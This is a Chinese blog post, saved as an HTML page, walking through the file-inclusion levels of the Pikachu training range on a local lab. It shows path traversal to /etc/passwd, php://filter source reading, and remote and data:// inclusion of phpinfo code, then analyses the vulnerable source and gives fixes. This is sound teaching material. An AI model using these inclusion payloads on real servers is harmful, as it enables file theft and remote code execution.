@@ -1,0 +1,297 @@
+<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>Pikachu靶场通关：文件包含 | Qu0rtz-blip 的博客</title><meta name="author" content="Qu0rtz-blip"><meta name="copyright" content="Qu0rtz-blip"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="皮卡丘（Pikachu）文件包含通关记录 实验环境：Windows 10 + Pikachu + Burp Suite靶场地址：http:&#x2F;&#x2F;127.0.0.1&#x2F;pikachu&#x2F;   本次记录皮卡丘靶场 File Inclusion 模块两个关卡的通关过程。这一关的输入是一个”文件名”，而文件名决定了服务器去执行哪个文件——打完两关再回源码，看一行 include &quot;include&#x2F;$f">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Pikachu靶场通关：文件包含">
+<meta property="og:url" content="https://qu0rtz-blip.github.io/2026/11/26/Pikachu-File-Inclusion/index.html">
+<meta property="og:site_name" content="Qu0rtz-blip 的博客">
+<meta property="og:description" content="皮卡丘（Pikachu）文件包含通关记录 实验环境：Windows 10 + Pikachu + Burp Suite靶场地址：http:&#x2F;&#x2F;127.0.0.1&#x2F;pikachu&#x2F;   本次记录皮卡丘靶场 File Inclusion 模块两个关卡的通关过程。这一关的输入是一个”文件名”，而文件名决定了服务器去执行哪个文件——打完两关再回源码，看一行 include &quot;include&#x2F;$f">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://qu0rtz-blip.github.io/img/cover-5.jpg">
+<meta property="article:published_time" content="2026-11-26T04:00:00.000Z">
+<meta property="article:modified_time" content="2026-11-26T11:44:49.103Z">
+<meta property="article:author" content="Qu0rtz-blip">
+<meta property="article:tag" content="Pikachu靶场">
+<meta property="article:tag" content="文件包含">
+<meta property="article:tag" content="LFI">
+<meta property="article:tag" content="RFI">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://qu0rtz-blip.github.io/img/cover-5.jpg"><script type="application/ld+json">{
+  "@context": "https://schema.org",
+  "@type": "BlogPosting",
+  "headline": "Pikachu靶场通关：文件包含",
+  "url": "https://qu0rtz-blip.github.io/2026/11/26/Pikachu-File-Inclusion/",
+  "image": "https://qu0rtz-blip.github.io/img/cover-5.jpg",
+  "datePublished": "2026-11-26T04:00:00.000Z",
+  "dateModified": "2026-11-26T11:44:49.103Z",
+  "author": [
+    {
+      "@type": "Person",
+      "name": "Qu0rtz-blip",
+      "url": "https://qu0rtz-blip.github.io"
+    }
+  ]
+}</script><link rel="shortcut icon" href="/img/favicon.png"><link rel="canonical" href="https://qu0rtz-blip.github.io/2026/11/26/Pikachu-File-Inclusion/index.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css?v=5.7.2"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@7.3.1/css/all.min.css"><script>
+    (() => {
+      
+    const saveToLocal = {
+      set: (key, value, ttl) => {
+        try {
+          const data = { value }
+
+          if (ttl != null) {
+            data.expiry = Date.now() + ttl * 86400000
+          }
+
+          localStorage.setItem(key, JSON.stringify(data))
+        } catch (e) {
+          console.error(e)
+        }
+      },
+      get: key => {
+        const itemStr = localStorage.getItem(key)
+        if (!itemStr) return
+
+        try {
+          const data = JSON.parse(itemStr)
+
+          if (data.expiry && Date.now() > data.expiry) {
+            localStorage.removeItem(key)
+            return
+          }
+
+          return data.value
+        } catch {
+          localStorage.removeItem(key)
+        }
+      }
+    }
+
+    const scriptCache = new Map()
+    const cssCache = new Map()
+    window.btf = {
+      saveToLocal,
+      getScript: (url, attr = {}) => {
+        if (scriptCache.has(url)) {
+          return scriptCache.get(url)
+        }
+
+        const promise = new Promise((resolve, reject) => {
+          const script = document.createElement('script')
+
+          script.src = url
+          script.async = true
+
+          for (const key in attr) {
+            script.setAttribute(key, attr[key])
+          }
+
+          script.onload = resolve
+          script.onerror = reject
+
+          document.head.appendChild(script)
+        })
+
+        scriptCache.set(url, promise)
+
+        return promise
+      },
+      getCSS: (url, id) => {
+        if (cssCache.has(url)) {
+          return cssCache.get(url)
+        }
+
+        const promise = new Promise((resolve, reject) => {
+          const link = document.createElement('link')
+
+          link.rel = 'stylesheet'
+          link.href = url
+
+          if (id) {
+            link.id = id
+          }
+
+          link.onload = resolve
+          link.onerror = reject
+
+          document.head.appendChild(link)
+        })
+
+        cssCache.set(url, promise)
+
+        return promise
+      },
+      addGlobalFn: (key, fn, name = false, parent = window) => {
+        if (!false && key.startsWith('pjax')) return
+        const globalFn = parent.globalFn || {}
+        globalFn[key] = globalFn[key] || {}
+        globalFn[key][name || Object.keys(globalFn[key]).length] = fn
+        parent.globalFn = globalFn
+      }
+    }
+  
+      
+      const metaThemeColor = document.querySelector('meta[name="theme-color"]')
+      const activateDarkMode = () => {
+        document.documentElement.dataset.theme = 'dark'
+        if (metaThemeColor !== null) {
+          metaThemeColor.setAttribute('content', '#0d0d0d')
+        }
+      }
+      const activateLightMode = () => {
+        document.documentElement.dataset.theme = 'light'
+        if (metaThemeColor !== null) {
+          metaThemeColor.setAttribute('content', '#ffffff')
+        }
+      }
+
+      btf.activateDarkMode = activateDarkMode
+      btf.activateLightMode = activateLightMode
+
+      const theme = saveToLocal.get('theme')
+    
+          theme === 'dark' ? activateDarkMode() : theme === 'light' ? activateLightMode() : null
+        
+      
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        document.documentElement.classList.toggle('hide-aside', asideStatus === 'hide')
+      }
+    
+      
+    const detectApple = () => {
+      if (/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)) {
+        document.documentElement.classList.add('apple')
+      }
+    }
+    detectApple()
+  
+    })()
+  </script><script>const GLOBAL_CONFIG = {
+  root: '/',
+  algolia: undefined,
+  localSearch: undefined,
+  translate: undefined,
+  highlight: {"plugin":"highlight.js","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false,"highlightFullpage":false,"highlightMacStyle":true},
+  copy: {
+    success: '复制成功',
+    error: '复制失败',
+    noSupport: '浏览器不支持'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: '',
+  dateSuffix: {
+    just: '刚刚',
+    min: '分钟前',
+    hour: '小时前',
+    day: '天前',
+    month: '个月前'
+  },
+  copyright: undefined,
+  lightbox: 'null',
+  Snackbar: undefined,
+  infinitegrid: {
+    js: 'https://cdn.jsdelivr.net/npm/@egjs/infinitegrid@4.13.1/dist/infinitegrid.min.js',
+    buttonText: '加载更多'
+  },
+  isPhotoFigcaption: false,
+  islazyloadPlugin: false,
+  isAnchor: false,
+  percent: {
+    toc: true,
+    rightside: false,
+  },
+  autoDarkmode: false
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  title: 'Pikachu靶场通关：文件包含',
+  isHighlightShrink: false,
+  isToc: true,
+  pageType: 'post'
+}</script><link rel="stylesheet" href="/css/custom.css"><meta name="generator" content="Hexo 7.3.0"></head><body><div class="bg-animation" id="web_bg" style="background-image: url(/img/bg-site.jpg);"></div><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img text-center"><img src="/img/avatar.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="site-data text-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">20</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">60</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">1</div></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> Home</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> Archives</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> Tags</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> Categories</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg fixed" id="page-header" style="background-image: url(/img/cover-5.jpg);"><nav id="nav"><span id="blog-info"><a class="nav-site-title" href="/"><span class="site-name">Qu0rtz-blip 的博客</span></a><a class="nav-page-title" href="/"><span class="site-name">Pikachu靶场通关：文件包含</span><span class="site-name"><i class="fa-solid fa-circle-arrow-left"></i><span>  返回首页</span></span></a></span><div id="menus"><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> Home</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> Archives</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> Tags</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> Categories</span></a></div></div><div id="toggle-menu"><span class="site-page"><i class="fas fa-bars fa-fw"></i></span></div></div></nav><div id="post-info"><h1 class="post-title">Pikachu靶场通关：文件包含</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2026-11-26T04:00:00.000Z" title="发表于 2026-11-26 12:00:00">2026-11-26</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2026-11-26T11:44:49.103Z" title="更新于 2026-11-26 19:44:49">2026-11-26</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/">网络安全</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title=""><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">浏览量:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="container post-content" id="article-container"><h1 id="皮卡丘（Pikachu）文件包含通关记录"><a href="#皮卡丘（Pikachu）文件包含通关记录" class="headerlink" title="皮卡丘（Pikachu）文件包含通关记录"></a>皮卡丘（Pikachu）文件包含通关记录</h1><blockquote>
+<p><strong>实验环境</strong>：Windows 10 + Pikachu + Burp Suite<br><strong>靶场地址</strong>：<code>http://127.0.0.1/pikachu/</code></p>
+</blockquote>
+<blockquote>
+<p>本次记录皮卡丘靶场 File Inclusion 模块两个关卡的通关过程。<br>这一关的输入是一个”文件名”，而文件名决定了服务器去执行哪个文件——<br>打完两关再回源码，看一行 <code>include &quot;include/$filename&quot;</code> 能玩出多少花样。</p>
+</blockquote>
+<hr>
+<h2 id="一、文件包含"><a href="#一、文件包含" class="headerlink" title="一、文件包含"></a>一、文件包含</h2><h3 id="1-1-什么是文件包含"><a href="#1-1-什么是文件包含" class="headerlink" title="1.1 什么是文件包含"></a>1.1 什么是文件包含</h3><p>文件包含本来是个<strong>功能</strong>：开发时把公共的头部、配置、函数库拆成单独文件，用包含函数引进来，避免重复代码。PHP 里对应四个函数：</p>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">include()        include_once()      ← 包含失败只报警告，脚本继续跑</span><br><span class="line">require()        require_once()      ← 包含失败直接致命错误，脚本终止</span><br></pre></td></tr></table></figure>
+
+<p>功能本身没问题，问题出在<strong>被包含的文件名是变量、且变量来自前端</strong>：<code>include $_GET[&#39;filename&#39;]</code> 这种写法，等于把”执行哪个文件”的决定权交给了访客。攻击者传一个”意料之外”的文件名，服务器就会去执行那个文件里的 PHP 代码。</p>
+<p>按能包含的范围，分两种：</p>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">本地文件包含（LFI）                     远程文件包含（RFI）</span><br><span class="line">包含服务器本地已有文件                  包含远程 URL 上的文件</span><br><span class="line">   ↓                                       ↓</span><br><span class="line">读配置/读源码/读日志/读隐藏文件          直接执行攻击者写的代码</span><br><span class="line">威力有限，但常与文件上传、日志投毒组合     需要 allow_url_include=On</span><br><span class="line">       └──────────────┬────────────────────────┘</span><br><span class="line">                      ↓</span><br><span class="line">              代码在 Web 进程权限下执行</span><br></pre></td></tr></table></figure>
+
+<h3 id="1-2-关卡入口"><a href="#1-2-关卡入口" class="headerlink" title="1.2 关卡入口"></a>1.2 关卡入口</h3><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/pikachu/vul/fileinclude/fileinclude.php   ← 概述页</span><br><span class="line">http://127.0.0.1/pikachu/vul/fileinclude/fi_local.php      ← 本地文件包含</span><br><span class="line">http://127.0.0.1/pikachu/vul/fileinclude/fi_remote.php     ← 远程文件包含</span><br></pre></td></tr></table></figure>
+
+<p>两个关卡页长得一样，都是一个下拉框——“which NBA player do you like?”，选了就提交 <code>filename</code> 参数。区别只在源码：本地包含把文件名拼在 <code>include/</code> 目录后面，远程包含直接拿整串去 <code>include</code>。</p>
+<hr>
+<h2 id="二、通关记录"><a href="#二、通关记录" class="headerlink" title="二、通关记录"></a>二、通关记录</h2><h3 id="2-1-本地文件包含"><a href="#2-1-本地文件包含" class="headerlink" title="2.1 本地文件包含"></a>2.1 本地文件包含</h3><p><img src="/images/%E7%9A%AE%E5%8D%A1%E4%B8%98%E9%9D%B6%E5%9C%BA/Pikachu-File-Inclusion/inclusion_start.png"></p>
+<h4 id="2-1-1-先正常选一个"><a href="#2-1-1-先正常选一个" class="headerlink" title="2.1.1 先正常选一个"></a>2.1.1 先正常选一个</h4><p>下拉框里五个球员，选「Kobe bryant」提交，URL 变成：</p>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/pikachu/vul/fileinclude/fi_local.php?filename=file1.php&amp;submit=提交</span><br></pre></td></tr></table></figure>
+
+
+<p><img src="/images/%E7%9A%AE%E5%8D%A1%E4%B8%98%E9%9D%B6%E5%9C%BA/Pikachu-File-Inclusion/inclusion_normal.png"></p>
+<p>页面出现了科比的介绍和照片。注意 URL 里的 <code>filename=file1.php</code>——<strong>参数值就是文件名</strong>，这就是入口。</p>
+<h4 id="2-1-2-猜一个不在下拉框里的文件"><a href="#2-1-2-猜一个不在下拉框里的文件" class="headerlink" title="2.1.2 猜一个不在下拉框里的文件"></a>2.1.2 猜一个不在下拉框里的文件</h4><p>下拉框只给了 file1~file5，但源码目录里可能还有别的。直接把参数改成 <code>file6.php</code> 试试：</p>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/pikachu/vul/fileinclude/fi_local.php?filename=file6.php&amp;submit=Submit</span><br></pre></td></tr></table></figure>
+
+
+<p><img src="/images/%E7%9A%AE%E5%8D%A1%E4%B8%98%E9%9D%B6%E5%9C%BA/Pikachu-File-Inclusion/local_file6.png"></p>
+<p>页面出现 “here is a secret box!”，下面跟着 <code>admin/admin</code>、<code>kobe/123456</code> 两组账号密码。<strong>这就是本地文件包含最典型的危害：把不想让你看见的文件读出来</strong>——它的防护全靠”文件名不告诉你”，而文件名是可以猜的（file、config、backup、index、admin、upload……）。</p>
+<h4 id="2-1-3-跳到目录外面去"><a href="#2-1-3-跳到目录外面去" class="headerlink" title="2.1.3 跳到目录外面去"></a>2.1.3 跳到目录外面去</h4><p>既然 <code>filename</code> 会拼在 <code>include/</code> 后面，那就用 <code>../</code> 往上跳，去读服务器上的系统文件：</p>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/pikachu/vul/fileinclude/fi_local.php?filename=../../../../etc/passwd&amp;submit=提交</span><br></pre></td></tr></table></figure>
+
+
+<p><img src="/images/%E7%9A%AE%E5%8D%A1%E4%B8%98%E9%9D%B6%E5%9C%BA/Pikachu-File-Inclusion/local_etc.png"></p>
+<p><code>/etc/passwd</code> 的内容出现在页面顶部。目录层级按实际部署调，<code>../</code> 多写几个不影响（超出根目录就停在根）。</p>
+<blockquote>
+<p>补充一个常用的变体：想看某个 PHP 文件的<strong>源码</strong>而不是执行结果时，用伪协议 <code>php://filter</code>：</p>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">filename=php://filter/read=convert.base64-encode/resource=../../index.php</span><br></pre></td></tr></table></figure>
+
+<p>回显是 base64，解码后就是源码——因为 <code>php://filter</code> 只读不执行，绕开了”包含 PHP 文件会被执行”的问题。</p>
+</blockquote>
+<h3 id="2-2-远程文件包含"><a href="#2-2-远程文件包含" class="headerlink" title="2.2 远程文件包含"></a>2.2 远程文件包含</h3><p>远程包含要求 <code>php.ini</code> 里 <code>allow_url_include=On</code>（默认是 Off），页面顶部会红字提示当前配置是否满足。如果不满足，进入容器内部，找到<code>php.ini</code>配置文件，将<code>allow_url_include</code>改为<code>On</code>即可。</p>
+<p>满足的话，我们先用 python 起一个简易的 HTTP 服务，再用 <code>ipconfig</code>命令查看本机局域网地址，并在文件夹下创建一个<code>shell.txt</code>，把内容写成：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="title function_ invoke__">phpinfo</span>(); <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p><code>filename</code> 可以传一个完整的 URL：</p>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/pikachu/vul/fileinclude/fi_remote.php?filename=http%3a//10.34.45.115%3a8888/shell.txt&amp;submit=Submit</span><br></pre></td></tr></table></figure>
+
+
+<p><img src="/images/%E7%9A%AE%E5%8D%A1%E4%B8%98%E9%9D%B6%E5%9C%BA/Pikachu-File-Inclusion/remote_success.png"></p>
+<p>页面跳出 phpinfo——<strong>服务器执行了远程主机上的 PHP 代码</strong>，这就不是”读文件”了，等于直接拿到代码执行权，和 RCE 一个级别。</p>
+<blockquote>
+<p>不想起 HTTP 服务的话，<code>allow_url_include=On</code> 时也可以用 <code>data://</code> 伪协议自包含：</p>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">filename=data://text/plain,&lt;?php phpinfo();?&gt;</span><br></pre></td></tr></table></figure>
+
+<p>注意 <code>data://</code> 同样受 <code>allow_url_include</code> 控制，且部分版本对 <code>&lt;?php</code> 里的 <code>+</code>、<code>&amp;</code> 需要 URL 编码。</p>
+</blockquote>
+<h3 id="2-3-失败长什么样"><a href="#2-3-失败长什么样" class="headerlink" title="2.3 失败长什么样"></a>2.3 失败长什么样</h3><p>传一个不存在的文件名（比如 <code>filename=file999.php</code>），页面基本是空白的——<code>include</code> 找不到文件只产生一条 warning，被页面模板吞掉了，不会像前面几关那样给固定文案。<strong>没有显式回显反而是好事</strong>：说明这是 <code>include</code> 而不是 <code>require</code>，包含失败不会中断脚本，可以放心试错。</p>
+<hr>
+<h2 id="三、源码分析：漏洞是怎么写出来的"><a href="#三、源码分析：漏洞是怎么写出来的" class="headerlink" title="三、源码分析：漏洞是怎么写出来的"></a>三、源码分析：漏洞是怎么写出来的</h2><h3 id="3-1-关卡：本地文件包含的拼接"><a href="#3-1-关卡：本地文件包含的拼接" class="headerlink" title="3.1 关卡：本地文件包含的拼接"></a>3.1 关卡：本地文件包含的拼接</h3><p><code>fi_local.php</code> 的核心代码：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$html</span>=<span class="string">&#x27;&#x27;</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;submit&#x27;</span>]) &amp;&amp; <span class="variable">$_GET</span>[<span class="string">&#x27;filename&#x27;</span>]!=<span class="literal">null</span>)&#123;</span><br><span class="line">    <span class="variable">$filename</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;filename&#x27;</span>];</span><br><span class="line">    <span class="keyword">include</span> <span class="string">&quot;include/<span class="subst">$filename</span>&quot;</span>;<span class="comment">//变量传进来直接包含,没做任何的安全限制</span></span><br><span class="line"><span class="comment">//     //安全的写法,使用白名单，严格指定包含的文件名</span></span><br><span class="line"><span class="comment">//     if($filename==&#x27;file1.php&#x27; || $filename==&#x27;file2.php&#x27; || $filename==&#x27;file3.php&#x27; || $filename==&#x27;file4.php&#x27; || $filename==&#x27;file5.php&#x27;)&#123;</span></span><br><span class="line"><span class="comment">//         include &quot;include/$filename&quot;;</span></span><br><span class="line"><span class="comment">//     &#125;</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>代码分析：</p>
+<ul>
+<li><code>include &quot;include/$filename&quot;</code> 是<strong>字符串拼接</strong>，<code>$_GET[&#39;filename&#39;]</code> 里的 <code>../</code>、<code>php://</code> 会被原样拼进去，路径穿越和伪协议都是这么来的；</li>
+<li>拼接没有做任何过滤，也没限定后缀——传 <code>file6.php</code> 能读隐藏文件，传 <code>../../../../etc/passwd</code> 能跳出目录；</li>
+<li>被注释掉的那段就是<strong>正确写法</strong>：白名单，只允许五个已知文件名。它摆在那儿是给你对比用的；</li>
+<li>页面里的下拉框只是”看起来限制了输入”，参数在 URL 里，改一下就能绕过——<strong>前端限制从来不算防护</strong>。</li>
+</ul>
+<h3 id="3-2-关卡：远程文件包含的裸奔"><a href="#3-2-关卡：远程文件包含的裸奔" class="headerlink" title="3.2 关卡：远程文件包含的裸奔"></a>3.2 关卡：远程文件包含的裸奔</h3><p><code>fi_remote.php</code> 的核心代码更短：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$html</span>=<span class="string">&#x27;&#x27;</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;submit&#x27;</span>]) &amp;&amp; <span class="variable">$_GET</span>[<span class="string">&#x27;filename&#x27;</span>]!=<span class="literal">null</span>)&#123;</span><br><span class="line">    <span class="variable">$filename</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;filename&#x27;</span>];</span><br><span class="line">    <span class="keyword">include</span> <span class="string">&quot;<span class="subst">$filename</span>&quot;</span>;<span class="comment">//变量传进来直接包含,没做任何的安全限制</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>代码分析：</p>
+<ul>
+<li>连 <code>include/</code> 前缀都省了，**整串交给 <code>include</code>**——本地路径、远程 URL、伪协议全部通吃；</li>
+<li>能不能打通远程只取决于 <code>php.ini</code> 的两个开关：<code>allow_url_fopen</code>（能不能打开远程 URL）和 <code>allow_url_include</code>（能不能 include 远程文件）。Pikachu 页面上那三行红字警告就是在检查这几个配置；</li>
+<li>源码里没有任何 <code>str_replace</code>、<code>basename()</code>、白名单——和本地那关一样，防护为零。</li>
+</ul>
+<p>那三行红字其实也提示了一个事实：<strong>远程包含在默认配置下是关着的</strong>，这也是为什么现实里 LFI 远比 RFI 常见。</p>
+<hr>
+<h2 id="四、修复方案"><a href="#四、修复方案" class="headerlink" title="四、修复方案"></a>四、修复方案</h2><p>文件包含的修复原则只有一条：<strong>不要让用户输入决定被包含的文件路径</strong>。业务上文件名应当由后端映射——前端传 ID 或枚举值，后端查表得到真实路径（<code>$map = [&#39;1&#39;=&gt;&#39;file1.php&#39;, ...]</code>），永远不要拼接。确实需要按名字包含时，先用 <code>basename()</code> 去掉路径部分，再用白名单校验，只允许固定后缀和固定目录，并用 <code>realpath()</code> 确认最终路径仍在允许的目录内（防止 <code>../</code> 穿越）。配置层面，<code>allow_url_include</code> 保持 Off（默认就是 Off，别为了”灵活”打开），<code>open_basedir</code> 限制 PHP 只能访问指定目录，关掉不必要的伪协议封装。再往上，上传目录禁止执行 PHP（<code>php_admin_flag engine off</code>）、把用户可写的目录排除在包含路径之外、WAF 拦 <code>../</code>、<code>php://</code>、<code>data://</code> 特征，都算加固。</p>
+<hr>
+<h2 id="五、免责声明"><a href="#五、免责声明" class="headerlink" title="五、免责声明"></a>五、免责声明</h2><p>本文所有操作均在<strong>本人本地搭建的 Pikachu 靶场</strong>中完成，<br>Pikachu 是公开的、专用于安全教学的漏洞练习平台。<br>文中涉及的技术仅用于学习与防御研究，<strong>不得用于任何未授权的系统</strong>。<br>对真实系统进行未授权的渗透测试属于违法行为。</p>
+<hr>
+</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta"><i class="fas fa-circle-user fa-fw"></i>文章作者: </span><span class="post-copyright-info"><a href="https://qu0rtz-blip.github.io">Qu0rtz-blip</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta"><i class="fas fa-square-arrow-up-right fa-fw"></i>文章链接: </span><span class="post-copyright-info"><a href="https://qu0rtz-blip.github.io/2026/11/26/Pikachu-File-Inclusion/">https://qu0rtz-blip.github.io/2026/11/26/Pikachu-File-Inclusion/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta"><i class="fas fa-circle-exclamation fa-fw"></i>版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来源 <a href="https://qu0rtz-blip.github.io" target="_blank">Qu0rtz-blip 的博客</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/Pikachu%E9%9D%B6%E5%9C%BA/">Pikachu靶场</a><a class="post-meta__tags" href="/tags/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/">文件包含</a><a class="post-meta__tags" href="/tags/LFI/">LFI</a><a class="post-meta__tags" href="/tags/RFI/">RFI</a></div><div class="post-share"><div class="social-share" data-image="/img/cover-5.jpg" data-sites="facebook,x,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.6/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.6/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><a class="pagination-related" href="/2026/11/26/Pikachu-PHP-Unserialize/" title="Pikachu靶场通关：PHP反序列化"><img class="cover" src="/img/cover-3.jpg" onerror="onerror=null;src='/img/404.jpg'" alt="cover of previous post"><div class="info"><div class="info-1"><div class="info-item-1">上一篇</div><div class="info-item-2">Pikachu靶场通关：PHP反序列化</div></div><div class="info-2"><div class="info-item-1">皮卡丘（Pikachu）PHP反序列化通关记录 实验环境：Windows 10 + Pikachu靶场地址：http://127.0.0.1/pikachu/   本次记录皮卡丘靶场 PHP 反序列化模块的通关过程。这一关只有一道题，但它背后是”把用户输入还原成对象”这个动作本身的问题：打完关再回源码，看漏洞是怎么被一行 unserialize($_POST[...]) 写出来的。   一、...</div></div></div></a><a class="pagination-related" href="/2026/11/26/Pikachu-Overpermission/" title="Pikachu靶场通关：越权"><img class="cover" src="/img/cover-1.jpg" onerror="onerror=null;src='/img/404.jpg'" alt="cover of next post"><div class="info text-right"><div class="info-1"><div class="info-item-1">下一篇</div><div class="info-item-2">Pikachu靶场通关：越权</div></div><div class="info-2"><div class="info-item-1">皮卡丘（Pikachu）越权通关记录 实验环境：Windows 10 + Pikachu + Burp Suite靶场地址：http://127.0.0.1/pikachu/   本次记录皮卡丘靶场 Over Permission（越权）模块两个关卡的通关过程。越权不是一个”技术点”，而是一个”校验点”：功能本身没写错，错在该校验的地方没校验。水平越权是横向借别人的数据，垂直越权是纵向借别人...</div></div></div></a></nav><div class="relatedPosts"><div class="headline"><i class="fas fa-thumbs-up fa-fw"></i><span>相关推荐</span></div><div class="relatedPosts-list"><a class="pagination-related" href="/2026/11/26/Pikachu-XXE/" title="Pikachu靶场通关：XXE"><img class="cover" src="/img/cover-3.jpg" alt="cover"><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2026-11-26</div><div class="info-item-2">Pikachu靶场通关：XXE</div></div><div class="info-2"><div class="info-item-1">皮卡丘（Pikachu）XXE 通关记录 实验环境：Windows 10 + Pikachu + Burp Suite靶场地址：http://127.0.0.1/pikachu/   本次记录皮卡丘靶场 XXE 模块的通关过程。这一关的输入从”字符串”换成了”一整个 XML 文档”，打完关再回源码，看一个解析选项怎么把”读文件”的能力送给了任意访客。   一、XXE1.1 什么是 XXEXX...</div></div></div></a><a class="pagination-related" href="/2026/11/12/Pikachu-BruteForce/" title="Pikachu靶场通关：Brute Force"><img class="cover" src="/img/cover-6.jpg" alt="cover"><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2026-11-12</div><div 